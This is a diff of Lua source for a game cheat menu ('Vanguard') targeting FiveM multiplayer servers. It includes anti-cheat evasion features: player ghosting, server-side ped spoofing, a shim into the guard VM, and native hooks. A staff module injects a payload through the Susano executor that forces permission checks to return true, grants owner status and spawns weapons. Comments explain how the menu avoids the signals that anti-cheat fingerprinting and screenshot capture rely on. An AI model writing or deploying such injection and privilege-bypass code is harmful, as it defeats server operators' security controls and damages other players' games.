+    end
+    return count
+end
+
+function A.hookJitter()
+    if type(H.installJittered) ~= "function" then return false end
+    return H.installJittered()
+end
+
+-- ---------------------------------------------------------------------------
+-- TICK / STATUS / PANIC
+-- ---------------------------------------------------------------------------
+function A.status()
+    local f = A.flags
+    return ("Evasion g%d l%d h%d v%d s%d f%d a%d x%d e%d shim%d"):format(
+        f.ghost and 1 or 0,
+        f.localHidden and 1 or 0,
+        f.harden and 1 or 0,
+        f.vehicleHarden and 1 or 0,
+        f.spoof and 1 or 0,
+        f.antiFreeze and 1 or 0,
+        f.antiAttach and 1 or 0,
+        f.antiSpectate and 1 or 0,
+        f.firewall and 1 or 0,
+        A.stats.shims
+    )
+end
+
+function A.tick()
+    local clock = now()
+    local ped = O.Ctx.ped
+    local respawned = ped ~= A._timers.ped
+    if respawned then A._timers.ped = ped end
+
+    if A.flags.ghost and (respawned or clock - A._timers.ghost > 2400) then
+        A._timers.ghost = clock
+        applyGhost()
+    end
+    if A.flags.localHidden and (respawned or clock - A._timers.localHidden > 2400) then
+        A._timers.localHidden = clock
+        applyLocalHidden(true)
+    end
+    if A.flags.harden and (respawned or clock - A._timers.harden > 3600) then
+        A._timers.harden = clock
+        applyHarden()
+    end
+    if A.flags.vehicleHarden and (respawned or clock - A._timers.vehicleHarden > 3600) then
+        A._timers.vehicleHarden = clock
+        applyVehicleHarden()
+    end
+    if A.flags.antiFreeze and (respawned or clock - A._timers.freeze > 1400) then
+        A._timers.freeze = clock
+        antiFreezeTick()
+    end
+    if A.flags.antiAttach and clock - A._timers.attach > 1200 then
+        A._timers.attach = clock
+        antiAttachTick()
+    end
+    if A.flags.antiSpectate and clock - A._timers.spectate > 1400 then
+        A._timers.spectate = clock
+        antiSpectateTick()
+    end
+
+    if A.flags.firewall and clock - (A.stats.lastScan or 0) > 45000 then
+        A.scanReportEvents()
+    end
+end
+
+function A.panic()
+    A.flags.ghost = false
+    A.flags.localHidden = false
+    A.flags.harden = false
+    A.flags.vehicleHarden = false
+    A.flags.spoof = false
+    A.flags.antiFreeze = false
+    A.flags.antiAttach = false
+    A.flags.antiSpectate = false
+    A.flags.firewall = false
+
+    clearGhost()
+    applyLocalHidden(false)
+    clearHarden()
+    if A._hardenVehicle ~= 0 then
+        clearVehicleHarden(A._hardenVehicle)
+        A._hardenVehicle = 0
+    end
+    antiSpectateTick()
+    A._spoofGen = A._spoofGen + 1
+    if has("SpoofPed") then pcall(Susano.SpoofPed, 0, false) end
+    restoreOutbound()
+    clearBlockedByA()
+end
+
+function A.boot()
+    O.every("evasion", 900, A.tick, 350)
+end
+
+return A
+
+end)(O,H,S)
+
+-- ---------------------------------------------------------------------------
+-- PART: 12_staff.lua
+-- ---------------------------------------------------------------------------
+local ST = (function(O)
+-- ============================================================================
+-- VANGUARD / 12 STAFF (Seed only)
+-- ----------------------------------------------------------------------------
+-- Offline staff menu payload, extracted verbatim from:
+--   C:\Users\caca\Documents\AC\Menu_Staff_Seed.lua
+--
+-- The payload is not Vanguard code. It runs inside the "seed" resource and
+-- depends on Seed's Modules/CPlayer/SEED classes. It is injected on demand via
+-- Susano.InjectResource("seed", code), with InjectionType.NEW_THREAD when the
+-- runtime exposes it. The original source called Lapsus.InjectResource; this
+-- integration deliberately uses only Susano, because that is the executor in
+-- use for this menu.
+--
+-- Nothing is injected at boot. If Susano.InjectResource is missing, or the seed
+-- resource is not injectable, the action refuses and logs; it does not fall back
+-- to another executor API or another resource.
+-- ============================================================================
+
+local ST = {}
+
+ST._injected = false
+
+ST.payload = [==[
+
+local _adm = Modules.Get('admin')
+
+CPlayer.HasPermission = function() return true end
+CPlayer().GM.isOwner = true
+
+local _weapons = {
+    {cat=" Pistolets", items={
+        {n="Pistol",              h="WEAPON_PISTOL"},
+        {n="Pistol MK2",         h="WEAPON_PISTOL_MK2"},
+        {n="Combat Pistol",      h="WEAPON_COMBATPISTOL"},
+        {n="AP Pistol",          h="WEAPON_APPISTOL"},
+        {n="Pistol .50",         h="WEAPON_PISTOL50"},
+        {n="SNS Pistol",         h="WEAPON_SNSPISTOL"},
+        {n="SNS Pistol MK2",     h="WEAPON_SNSPISTOL_MK2"},
+        {n="Heavy Pistol",       h="WEAPON_HEAVYPISTOL"},
+        {n="Vintage Pistol",     h="WEAPON_VINTAGEPISTOL"},
+        {n="Marksman Pistol",    h="WEAPON_MARKSMANPISTOL"},
+        {n="Revolver",           h="WEAPON_REVOLVER"},
+        {n="Revolver MK2",       h="WEAPON_REVOLVER_MK2"},
+        {n="Double Action",      h="WEAPON_DOUBLEACTION"},
+        {n="Ceramic Pistol",     h="WEAPON_CERAMICPISTOL"},
+        {n="Navy Revolver",      h="WEAPON_NAVYREVOLVER"},
+        {n="Gadget Pistol",      h="WEAPON_GADGETPISTOL"},
+        {n="Stun Gun",           h="WEAPON_STUNGUN"},
+        {n="Flare Gun",          h="WEAPON_FLAREGUN"},
+        {n="Glock 17",           h="WEAPON_GLOCK17"},
+        {n="USP",                h="WEAPON_USP"},
+        {n="Desert Eagle",       h="WEAPON_DEAGLEDRAGON"},
+        {n="CZ9",                h="WEAPON_CZ9"},
+        {n="FN Pistol",          h="WEAPON_FNPISTOL"},
+        {n="PPK Pistol",         h="WEAPON_PPKPISTOL"},
+    }},
+    {cat=" SMG / PDW", items={
+        {n="Micro SMG",          h="WEAPON_MICROSMG"},
+        {n="SMG",                h="WEAPON_SMG"},
+        {n="SMG MK2",            h="WEAPON_SMG_MK2"},
+        {n="Assault SMG",        h="WEAPON_ASSAULTSMG"},
+        {n="Combat PDW",         h="WEAPON_COMBATPDW"},
+        {n="Machine Pistol",     h="WEAPON_MACHINEPISTOL"},
+        {n="Mini SMG",           h="WEAPON_MINISMG"},
+        {n="MP7",                h="WEAPON_MP7"},
+        {n="MP5K",               h="WEAPON_MP5K"},
+        {n="Bizon",              h="WEAPON_BIZON"},
+        {n="Vector Xmas",        h="WEAPON_VECTORXMAS"},
+        {n="UMP",                h="WEAPON_UMP"},
+        {n="PPSH-41",            h="WEAPON_PPSH41"},
+        {n="SMG45",              h="WEAPON_SMG45"},
+    }},
+    {cat=" Fusils d'assaut", items={
+        {n="Assault Rifle",      h="WEAPON_ASSAULTRIFLE"},
+        {n="Assault Rifle MK2",  h="WEAPON_ASSAULTRIFLE_MK2"},
+        {n="Carbine Rifle",      h="WEAPON_CARBINERIFLE"},
+        {n="Carbine Rifle MK2",  h="WEAPON_CARBINERIFLE_MK2"},
+        {n="Special Carbine",    h="WEAPON_SPECIALCARBINE"},
+        {n="Special Carbine MK2",h="WEAPON_SPECIALCARBINE_MK2"},
+        {n="Bullpup Rifle",      h="WEAPON_BULLPUPRIFLE"},
+        {n="Bullpup Rifle MK2",  h="WEAPON_BULLPUPRIFLE_MK2"},
+        {n="Heavy Rifle",        h="WEAPON_HEAVYRIFLE"},
+        {n="Military Rifle",     h="WEAPON_MILITARYRIFLE"},
+        {n="Tactical Rifle",     h="WEAPON_TACTICALRIFLE"},
+        {n="Battle Rifle",       h="WEAPON_BATTLERIFLE"},
+        {n="Compact Rifle",      h="WEAPON_COMPACTRIFLE"},
+        {n="AN-94",              h="WEAPON_AN94"},
+        {n="AUG",                h="WEAPON_AUG"},
+        {n="FAMAS",              h="WEAPON_FAMAS"},
+        {n="G36",                h="WEAPON_G36"},
+        {n="Galil",              h="WEAPON_GALIL"},
+        {n="GRAU",               h="WEAPON_GRAU"},
+        {n="M416",               h="WEAPON_M416"},
+        {n="MCX",                h="WEAPON_MCX"},
+        {n="Scar-17",            h="WEAPON_SCAR17"},
+        {n="SIG 550",            h="WEAPON_SIG550"},
+        {n="AS VAL",             h="WEAPON_ASVAL"},
+        {n="C58",                h="WEAPON_C58"},
+        {n="M4 Beast",           h="WEAPON_M4BEAST"},
+        {n="AR-15",              h="WEAPON_AR15"},
+        {n="ATR",                h="WEAPON_ATR"},
+        {n="GROZA",              h="WEAPON_GROZA"},
+        {n="Programma AR",       h="WEAPON_GUZI"},
+    }},
+    {cat=" Snipers", items={
+        {n="Sniper Rifle",       h="WEAPON_SNIPERRIFLE"},
+        {n="Heavy Sniper",       h="WEAPON_HEAVYSNIPER"},
+        {n="Heavy Sniper MK2",   h="WEAPON_HEAVYSNIPER_MK2"},
+        {n="Marksman Rifle",     h="WEAPON_MARKSMANRIFLE"},
+        {n="Marksman Rifle MK2", h="WEAPON_MARKSMANRIFLE_MK2"},
+        {n="Precision Rifle",    h="WEAPON_PRECISIONRIFLE"},
+        {n="Dragunov",           h="WEAPON_DRAGUNOV"},
+        {n="REG 700",            h="WEAPON_REG700"},
+        {n="K2 Sniper",          h="WEAPON_K2"},
+        {n="AWM Blue",           h="WEAPON_AWMBLUE"},
+        {n="AWM Frost",          h="WEAPON_AWMFROST"},
+        {n="AWP Ice",            h="WEAPON_AWPICE"},
+        {n="Blacksniper",        h="WEAPON_BLACKSNIPER"},
+        {n="Redsniper",          h="WEAPON_REDSNIPER"},
+        {n="Hellsniper",         h="WEAPON_HELLSNIPER"},
+    }},
+    {cat=" Shotguns", items={
+        {n="Pump Shotgun",       h="WEAPON_PUMPSHOTGUN"},
+        {n="Pump Shotgun MK2",   h="WEAPON_PUMPSHOTGUN_MK2"},
+        {n="Sawn-off Shotgun",   h="WEAPON_SAWNOFFSHOTGUN"},
+        {n="Bullpup Shotgun",    h="WEAPON_BULLPUPSHOTGUN"},
+        {n="Assault Shotgun",    h="WEAPON_ASSAULTSHOTGUN"},
+        {n="Musket",             h="WEAPON_MUSKET"},
+        {n="Heavy Shotgun",      h="WEAPON_HEAVYSHOTGUN"},
+        {n="DB Shotgun",         h="WEAPON_DBSHOTGUN"},
+        {n="Auto Shotgun",       h="WEAPON_AUTOSHOTGUN"},
+        {n="Combat Shotgun",     h="WEAPON_COMBATSHOTGUN"},
+        {n="DAO Shotgun",        h="WEAPON_DAO"},
+        {n="Coach Gun",          h="WEAPON_COACHGUN"},
+    }},
+    {cat=" Mitrailleuses", items={
+        {n="MG",                 h="WEAPON_MG"},
+        {n="Combat MG",          h="WEAPON_COMBATMG"},
+        {n="Combat MG MK2",      h="WEAPON_COMBATMG_MK2"},
+        {n="Gusenberg",          h="WEAPON_GUSENBERG"},
+        {n="Minigun",            h="WEAPON_MINIGUN"},
+    }},
+    {cat=" Corps-à-corps", items={
+        {n="Knife",              h="WEAPON_KNIFE"},
+        {n="Nightstick",         h="WEAPON_NIGHTSTICK"},
+        {n="Hammer",             h="WEAPON_HAMMER"},
+        {n="Bat",                h="WEAPON_BAT"},
+        {n="Golf Club",          h="WEAPON_GOLFCLUB"},
+        {n="Crowbar",            h="WEAPON_CROWBAR"},
+        {n="Machete",            h="WEAPON_MACHETE"},
+        {n="Hatchet",            h="WEAPON_HATCHET"},
+        {n="Knuckle",            h="WEAPON_KNUCKLE"},
+        {n="Dagger",             h="WEAPON_DAGGER"},
+        {n="Battle Axe",         h="WEAPON_BATTLEAXE"},
+        {n="Pool Cue",           h="WEAPON_POOLCUE"},
+        {n="Bottle",             h="WEAPON_BOTTLE"},
+        {n="Switchblade",        h="WEAPON_SWITCHBLADE"},
+        {n="Wrench",             h="WEAPON_WRENCH"},
+        {n="Sledgehammer",       h="WEAPON_SLEDGEHAMMER"},
+        {n="Stone Hatchet",      h="WEAPON_STONE_HATCHET"},
+        {n="Chainsaw",           h="WEAPON_CHAINSAW"},
+        {n="Katana",             h="WEAPON_KATANA"},
+        {n="Flashlight",         h="WEAPON_FLASHLIGHT"},
+        {n="Stunrod",            h="WEAPON_STUNROD"},
+        {n="Bowie",              h="WEAPON_BOWIE"},
+        {n="Skewer",             h="WEAPON_SKEWER"},
+        {n="Lightsaber",         h="WEAPON_LIGHTSABER"},
+    }},
+    {cat=" Explosifs", items={
+        {n="Grenade",            h="WEAPON_GRENADE"},
+        {n="Molotov",            h="WEAPON_MOLOTOV"},
+        {n="Sticky Bomb",        h="WEAPON_STICKYBOMB"},
+        {n="Proximity Mine",     h="WEAPON_PROXMINE"},
+        {n="Pipe Bomb",          h="WEAPON_PIPEBOMB"},
+        {n="BZ Gas",             h="WEAPON_BZGAS"},
+        {n="Smoke Grenade",      h="WEAPON_SMOKEGRENADE"},
+        {n="Flare",              h="WEAPON_FLARE"},
+        {n="RPG",                h="WEAPON_RPG"},
+        {n="Grenade Launcher",   h="WEAPON_GRENADELAUNCHER"},
+        {n="Firework",           h="WEAPON_FIREWORK"},
+        {n="Railgun",            h="WEAPON_RAILGUN"},
+        {n="Homing Launcher",    h="WEAPON_HOMINGLAUNCHER"},
+        {n="Compact Launcher",   h="WEAPON_COMPACTLAUNCHER"},
+        {n="EMP Launcher",       h="WEAPON_EMPLAUNCHER"},
+        {n="Railgun XM3",        h="WEAPON_RAILGUNXM3"},
+        {n="Minigun Olaf",       h="WEAPON_OLAFMINIGUN"},
+    }},
+    {cat=" Customs serveur", items={
+        {n="M4 Shark",           h="WEAPON_M4SHARK"},
+        {n="M4 Dragon",          h="WEAPON_DRAGON"},
+        {n="AK Dragon",          h="WEAPON_AKSHAN"},
+        {n="AK San",             h="WEAPON_AKSAN"},
+        {n="Deagle Dragon",      h="WEAPON_DEAGLEDRAGON"},
+        {n="Sniper Kraken",      h="WEAPON_SNIPERKRAKEN"},
+        {n="Scar Kraken",        h="WEAPON_SCARKRAKEN"},
+        {n="SMG Kraken",         h="WEAPON_SMGKRAKEN"},
+        {n="Pistol Kraken",      h="WEAPON_PISTOLKRAKEN"},
+        {n="Sawn Kraken",        h="WEAPON_SAWNKRAKEN"},
+        {n="M4 Summer",          h="WEAPON_M4SUM"},
+        {n="AK Zombie",          h="WEAPON_AKZOMBIE"},
+        {n="Katana Thermique",   h="WEAPON_THERMAL_KATANA"},
+        {n="Elucidator",         h="WEAPON_ELUCIDATOR"},
+        {n="Thor Hammer",        h="WEAPON_THORHAMMER"},
+        {n="Lightsaber",         h="WEAPON_LIGHTSABER"},
+        {n="M4 Gold Beast",      h="WEAPON_M4GOLDBEAST"},
+        {n="Revolver Ultra",     h="WEAPON_REVOLVERULTRA"},
+        {n="Alien",              h="WEAPON_ALIEN"},
+        {n="Gutsling",           h="WEAPON_GUTSLING"},
+        {n="Sovereign",          h="WEAPON_SOVEREIGN"},
+        {n="Oblivion",           h="WEAPON_OBLIVION"},
+        {n="Dragon AK",          h="WEAPON_AKSANTAS"},
+        {n="Grau",               h="WEAPON_GRAU"},
+        {n="Predator",           h="WEAPON_PREDATOR"},
+    }},
+}
+
+local function _giveWeapon(weaponHash, ammo)
+    local ped = PlayerPedId()
+    local hash = type(weaponHash) == "number" and weaponHash or GetHashKey(weaponHash)
+    if not HasPedGotWeapon(ped, hash, false) then
+        GiveWeaponToPed(ped, hash, ammo or 9999, false, true)
+    else
+        AddAmmoToPed(ped, hash, ammo or 9999)
+        SetCurrentPedWeapon(ped, hash, true)
+    end
+end
+
+local _wepMenu      = SEED.Classes.xMenu('admin_spawn_weapon_menu',      'Armes',   'Catégories')
+local _wepSearchMenu= SEED.Classes.xMenu('admin_spawn_weapon_search_menu','Recherche arme', 'Résultats')
+local _catMenus     = {}
+
+for i = 1, #_weapons do
+    local catData = _weapons[i]
+    local catMenu = SEED.Classes.xMenu('admin_spawn_wep_cat_'..i, catData.cat, 'Armes')
+
+    for j = 1, #catData.items do
+        local w = catData.items[j]
+        catMenu:AddButton(w.n):SetRightText('→'):on('buttonPress', function()
+            _giveWeapon(w.h, 9999)
+        end)
+    end
+
+    _catMenus[i] = catMenu
+    _wepMenu:AddSubmenu(catMenu):SetRightText('➤')
+end
+
+_wepMenu:AddButton('🔎 Rechercher une arme'):SetIcon('fa-solid fa-magnifying-glass'):on('buttonPress', function()
+    local inputBox = SEED.Classes.InputBox('Nom de l\'arme (ex: pistol, rifle...)', { maxCharacters = 60 })
+    inputBox:on('confirmed', function(result)
+        if not result or result == '' then return end
+        inputBox:Close()
+
+        local search = result:lower()
+        _wepSearchMenu:Reset()
+
+        local found = 0
+        for i = 1, #_weapons do
+            local catData = _weapons[i]
+            for j = 1, #catData.items do
+                local w = catData.items[j]
+                if w.n:lower():find(search, 1, true) or w.h:lower():find(search, 1, true) then
+                    found = found + 1
+                    _wepSearchMenu:AddButton(('[%s] %s'):format(catData.cat, w.n)):SetRightText('→'):on('buttonPress', function()
+                        _giveWeapon(w.h, 9999)
+                    end)
+                end
+            end
+        end
+
+        if found == 0 then
+            _wepSearchMenu:AddButton('Aucun résultat.')
+        end
+
+        _wepSearchMenu:Refresh()
+        _wepMenu:SwitchTo(_wepSearchMenu)
+    end)
+end)
+
+_adm.OpenAdminMenu()
+
+if _adm.spawnMenu then
+    _adm.spawnMenu:AddSubmenu(_wepMenu):SetIcon('fa-solid fa-gun')
+else
+    SEED.Thread(function()
+        local timeout = GetGameTimer() + 5000
+        while not _adm.spawnMenu and GetGameTimer() < timeout do
+            Wait(100)
+        end
+        if _adm.spawnMenu then
+            _adm.spawnMenu:AddSubmenu(_wepMenu):SetIcon('fa-solid fa-gun')
+        else
+        end
+    end)
+end
+
+if _adm.ToggleIds then _adm.ToggleIds() end
+
+]==]
+
+-- Susano only. The staff payload is injected into "seed" with
+-- Susano.InjectResource; no other executor API is probed.
+local function susano()
+    local api = rawget(_G, "Susano")
+    if type(api) == "table" and type(api.InjectResource) == "function" then
+        return api
+    end
+    return nil
+end
+
+local function seedState()
+    local state = "unknown"
+    if type(GetResourceState) == "function" then
+        local ok, value = pcall(GetResourceState, "seed")
+        if ok and type(value) == "string" then state = value end
+    end
+    return state
+end
+
+function ST.available()
+    return susano() ~= nil, rawget(_G, "SEED") ~= nil, seedState()
+end
+
+function ST.status()
+    local ready, seed, state = ST.available()
+    if not ready then
+        return ("Staff: Susano.InjectResource unavailable (seed %s)"):format(state)
+    end
+    if not seed then
+        return ("Staff: Susano ready (seed %s; target self-checks)"):format(state)
+    end
+    return ("Staff: Susano ready (seed %s)"):format(state)
+end
+
+local function injectCode(code)
+    local api = susano()
+    if not api then
+        return false, "Susano.InjectResource unavailable"
+    end
+
+    local injectionType = api.InjectionType
+    local ok, result
+    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
+        ok, result = pcall(api.InjectResource, "seed", code, injectionType.NEW_THREAD)
+    else
+        ok, result = pcall(api.InjectResource, "seed", code)
+    end
+
+    if not ok then
+        return false, tostring(result)
+    end
+    if result == false then
+        return false, "Susano.InjectResource returned false"
+    end
+    return true
+end
+
+function ST.inject()
+    if not susano() then
+        O.log("staff: Susano.InjectResource unavailable")
+        return false
+    end
+    if ST._injected then
+        O.log("staff: already injected this session (reset marker to retry)")
+        return false
+    end
+
+    -- Marker first: a second click while Seed is still constructing menus must
+    -- not create a second admin menu. ST.reset() clears it for a clean retry.
+    local code = table.concat({
+        "if _G.__vgd_staff_loaded then return end",
+        "if not (Modules and Modules.Get and CPlayer and SEED and SEED.Classes and SEED.Classes.xMenu) then return end",
+        "local __adm = Modules.Get('admin'); if not __adm then return end",
+        "_G.__vgd_staff_loaded = true",
+        ST.payload,
+    }, "\n")
+
+    local ok, err = injectCode(code)
+    if not ok then
+        O.log("staff: Susano injection failed: %s", tostring(err))
+        return false
+    end
+
+    ST._injected = true
+    O.log("staff: offline staff menu injected via Susano")
+    return true
+end
+
+function ST.reopen()
+    if not susano() then return false end
+    local code = "local adm = Modules and Modules.Get and Modules.Get('admin'); if adm and adm.OpenAdminMenu then adm.OpenAdminMenu() end"
+    local ok, err = injectCode(code)
+    if not ok then
+        O.log("staff: Susano reopen failed: %s", tostring(err))
+        return false
+    end
+    O.log("staff: admin menu reopened via Susano")
+    return true
+end
+
+function ST.reset()
+    if not susano() then return false end
+    local ok, err = injectCode("_G.__vgd_staff_loaded = nil")
+    if not ok then
+        O.log("staff: Susano reset failed: %s", tostring(err))
+        return false
+    end
+    ST._injected = false
+    O.log("staff: marker cleared via Susano")
+    return true
+end
+
+return ST
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 07_menu.lua
+-- ---------------------------------------------------------------------------
+local U = (function(O,H,S,E,D,F,V,M,SN,C,A,ST,Menu)
+-- ============================================================================
+-- VANGUARD / 07 MENU + PANIC
+-- ----------------------------------------------------------------------------
+-- The menu is the only place the user touches this. Everything it can do is a
+-- toggle, a selector or a one-shot action; nothing here is a mode the user can
+-- get stuck in without a way out.
+--
+-- Overlay rule: all drawing goes through the executor's overlay (Susano's
+-- BeginFrame/SubmitFrame via Menu.OnRender). No DrawRect, no DrawText, no
+-- DrawNotification from the game's own renderer. Those natives are the single
+-- most common menu fingerprint and they are also what in-game screenshot
+-- capture sees. The executor overlay is composited outside that path.
+-- ============================================================================
+
+local UI = {}
+
+local function readToggle(item)
+    return item and item.value == true
+end
+
+local function readSelector(item, fallback)
+    if not item then return fallback end
+    return item.selected or fallback or 1
+end
+
+local function readSlider(item, fallback)
+    if not item then return fallback end
+    return item.value or fallback or 0
+end
+
+-- ---------------------------------------------------------------------------
+-- PANIC. One function, called from the menu and from a key. It must be safe to
+-- call twice, and safe to call when nothing is armed.
+-- ---------------------------------------------------------------------------
+function UI.panic()
+    A.panic()
+    H.remove()
+    D.detachShell()
+    E.destroyAll()
+    C.stop()
+
+    H.flags.vitals = false
+    H.flags.quiet = false
+    H.flags.stealth = false
+    H.flags.ghost = false
+    H.flags.refill = false
+    H.flags.wanted = false
+    H.flags.protect = false
+
+    S.suppressOn = false
+    S.disableOverlayProbe = false
+    S.unblockAll()
+
+    F.clearPlatform()
+    F.clearFloor()
+    F.clearRamps()
+
+    pcall(function()
+        ClearOverrideWeather()
+        ClearWeatherTypePersist()
+        NetworkClearClockTimeOverride()
+        SetArtificialLightsState(false)
+        SetEntityAlpha(PlayerPedId(), 255, false)
+    end)
+
+    if syncEvasion then syncEvasion() end
+
+    O.log("panic: hooks off, local entities deleted, state vanilla")
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- BUILD THE CATEGORY
+-- ---------------------------------------------------------------------------
+local guardItem
+local hooksItem
+local overlayItem
+local vitalsItem
+local quietItem
+local stealthItem
+local ghostHeightItem
+
+local shellToggle
+local shellSelector
+local platformItem
+local crashStatusItem
+local evasionStatusItem
+local staffStatusItem
+local syncEvasion
+
+local weatherSelector
+local timeSlider
+
+local function shellFromIndex(index)
+    local list = D.shellModelList()
+    local i = math.max(1, math.min(#list, index or 1))
+    return list[i]
+end
+
+local shieldItems = {}
+local evasionItems = {}
+local staffItems = {}
+local ghostItems = {}
+local sandboxItems = {}
+local crashItems = {}
+local sentinelItems = {}
+local debugItems = {}
+
+-- --- Shield ----------------------------------------------------------------
+guardItem = { name = "Guard: scanning", type = "action", onClick = function()
+    local n = S.scan()
+    guardItem.name = ("Guard: %s"):format(n > 0 and S.describe() or "none")
+    O.log("scan: %d candidate(s)", n)
+end }
+
+hooksItem = { name = "Native guards", type = "toggle", value = false, onClick = function(v)
+    if v then
+        local n = H.install()
+        O.log("native guards installed: %d", n)
+    else
+        H.remove()
+    end
+end }
+
+overlayItem = { name = "Overlay probe shield", type = "toggle", value = false, onClick = function(v)
+    S.setOverlayProbe(v)
+end }
+
+local suppressItem = { name = "Suppression pulse", type = "toggle", value = false, onClick = function(v)
+    S.setSuppress(v)
+end }
+
+vitalsItem = { name = "Vitals echo", type = "toggle", value = false, onClick = function(v)
+    H.flags.vitals = v
+end }
+
+quietItem = { name = "Quiet feet", type = "toggle", value = false, onClick = function(v)
+    H.flags.quiet = v
+end }
+
+stealthItem = { name = "Stealth reads", type = "toggle", value = false, onClick = function(v)
+    H.flags.stealth = v
+end }
+
+ghostHeightItem = { name = "Height consistency", type = "toggle", value = false, onClick = function(v)
+    H.flags.ghost = v
+end }
+
+local wantedItem = { name = "Wanted reads", type = "toggle", value = false, onClick = function(v)
+    H.flags.wanted = v
+end }
+
+local refillItem = { name = "Post-probe refill", type = "toggle", value = false, onClick = function(v)
+    H.flags.refill = v
+end }
+
+local floorItem = { name = "Floor (anti-noclip, geometry)", type = "toggle", value = false, onClick = function(v)
+    if v then
+        floorItem.value = F.toggleFloor()
+    else
+        F.clearFloor()
+        floorItem.value = false
+    end
+end }
+
+local launderAction = { name = "Launder declarations (framework invoker)", type = "action", onClick = function()
+    local ac = S.primary()
+    if not ac then
+        O.log("launder: no guard")
+        return
+    end
+    V.launder(ac)
+end }
+
+shieldItems = {
+    { name = "", isSeparator = true, separatorText = "Guard" },
+    guardItem,
+    suppressItem,
+    overlayItem,
+    hooksItem,
+    { name = "", isSeparator = true, separatorText = "Read repair" },
+    vitalsItem,
+    quietItem,
+    stealthItem,
+    ghostHeightItem,
+    wantedItem,
+    refillItem,
+    floorItem,
+    launderAction,
+    { name = "", isSeparator = true, separatorText = "Panic" },
+    { name = "PANIC - return to vanilla", type = "action", onClick = function()
+        UI.panic()
+        hooksItem.value = false
+        suppressItem.value = false
+        overlayItem.value = false
+        vitalsItem.value = false
+        quietItem.value = false
+        stealthItem.value = false
+        ghostHeightItem.value = false
+        wantedItem.value = false
+        if shellToggle then shellToggle.value = false end
+    end },
+}
+
+-- --- Evasion ---------------------------------------------------------------
+-- Expert layer. Everything is off until clicked. The deep shim is one-shot
+-- and irreversible inside the guard VM; the firewall wrapper is restored on
+-- disable and on panic.
+local ghostToggle
+ghostToggle = { name = "True ghost stack", type = "toggle", value = false, onClick = function(v)
+    if not A.setGhost(v) then ghostToggle.value = false end
+end }
+
+local localHiddenToggle = { name = "Local hidden (screenshots)", type = "toggle", value = false, onClick = function(v)
+    A.setLocalHidden(v)
+end }
+
+local hardenToggle = { name = "Proof hardening", type = "toggle", value = false, onClick = function(v)
+    A.setHarden(v)
+end }
+
+local vehicleHardenToggle = { name = "Vehicle hardening", type = "toggle", value = false, onClick = function(v)
+    A.setVehicleHarden(v)
+end }
+
+local spoofToggle
+spoofToggle = { name = "Server ped spoof", type = "toggle", value = false, onClick = function(v)
+    if not A.setSpoof(v) then spoofToggle.value = false end
+end }
+
+local spoofSelector = { name = "Spoof model", type = "selector", options = A.spoofModels, selected = 1,
+    onClick = function(index)
+        A.spoofIndex = index
+        if A.flags.spoof then
+            A.setSpoof(false)
+            Citizen.CreateThread(function()
+                Citizen.Wait(250)
+                A.setSpoof(true)
+            end)
+        end
+    end }
+
+local antiFreezeToggle = { name = "Anti-freeze (own ped)", type = "toggle", value = false, onClick = function(v)
+    A.setAntiFreeze(v)
+end }
+
+local antiAttachToggle = { name = "Anti-attach (own ped)", type = "toggle", value = false, onClick = function(v)
+    A.setAntiAttach(v)
+end }
+
+local antiSpectateToggle = { name = "Anti-spectate", type = "toggle", value = false, onClick = function(v)
+    A.setAntiSpectate(v)
+end }
+
+local protectToggle = { name = "Self-protection hooks", type = "toggle", value = false, onClick = function(v)
+    H.flags.protect = v
+    if v and H.installed() == 0 then H.install() end
+end }
+
+local firewallToggle = { name = "Event firewall (reports only)", type = "toggle", value = false, onClick = function(v)
+    A.setFirewall(v)
+end }
+
+evasionStatusItem = { name = "Evasion: idle", type = "action", onClick = function()
+    O.log(A.status())
+end }
+
+syncEvasion = function()
+    ghostToggle.value = false
+    localHiddenToggle.value = false
+    hardenToggle.value = false
+    vehicleHardenToggle.value = false
+    spoofToggle.value = false
+    antiFreezeToggle.value = false
+    antiAttachToggle.value = false
+    antiSpectateToggle.value = false
+    protectToggle.value = false
+    H.flags.protect = false
+    firewallToggle.value = false
+end
+
+local clearAdvanced = { name = "Clear advanced state", type = "action", onClick = function()
+    A.panic()
+    syncEvasion()
+    O.log("evasion: cleared")
+end }
+
+evasionItems = {
+    { name = "", isSeparator = true, separatorText = "Identity" },
+    ghostToggle,
+    localHiddenToggle,
+    spoofToggle,
+    spoofSelector,
+    { name = "", isSeparator = true, separatorText = "Protection" },
+    hardenToggle,
+    vehicleHardenToggle,
+    antiFreezeToggle,
+    antiAttachToggle,
+    antiSpectateToggle,
+    protectToggle,
+    { name = "", isSeparator = true, separatorText = "Channels" },
+    firewallToggle,
+    { name = "Deep shim: primary guard", type = "action", onClick = function()
+        local n = A.shim(S.primary(), false)
+        O.log("evasion: %d shim(s)", n)
+    end },
+    { name = "Deep shim: all guards", type = "action", onClick = function()
+        local n = A.shim(nil, true)
+        O.log("evasion: %d shim(s)", n)
+    end },
+    { name = "Jittered native hooks", type = "action", onClick = function()
+        if not A.hookJitter() then O.log("evasion: hook install already running") end
+    end },
+    { name = "", isSeparator = true, separatorText = "State" },
+    evasionStatusItem,
+    clearAdvanced,
+    { name = "Firewall never blocks heartbeat names", type = "action", onClick = function()
+        O.log("evasion: safe list wins before the report list; ach_/acr_/axa_/axb_ pass")
+    end },
+    { name = "Legacy Seed shares hook hashes - use one path", type = "action", onClick = function()
+        O.log("evasion: arm Vanguard hooks or legacy Seed, not both")
+    end },
+}
+
+-- --- Staff (Seed only, Susano) ----------------------------------------------
+-- The payload is the offline staff menu from Menu_Staff_Seed.lua. It is never
+-- injected at boot. This tab forwards only to Susano.InjectResource("seed", ...).
+staffStatusItem = { name = ST.status(), type = "action", onClick = function()
+    O.log(ST.status())
+end }
+
+staffItems = {
+    { name = "", isSeparator = true, separatorText = "Seed" },
+    staffStatusItem,
+    { name = "Inject offline staff menu", type = "action", onClick = function()
+        ST.inject()
+        staffStatusItem.name = ST.status()
+    end },
+    { name = "Reopen staff admin menu", type = "action", onClick = function()
+        ST.reopen()
+        staffStatusItem.name = ST.status()
+    end },
+    { name = "Reset staff marker", type = "action", onClick = function()
+        ST.reset()
+        staffStatusItem.name = ST.status()
+    end },
+    { name = "", isSeparator = true, separatorText = "Notes" },
+    { name = "Susano only - target seed", type = "action", onClick = function()
+        O.log("staff: uses Susano.InjectResource('seed', code); no other executor API")
+    end },
+    { name = "Panic does not un-inject the staff chunk", type = "action", onClick = function()
+        O.log("staff: use Reset marker + restart seed for a clean state")
+    end },
+}
+
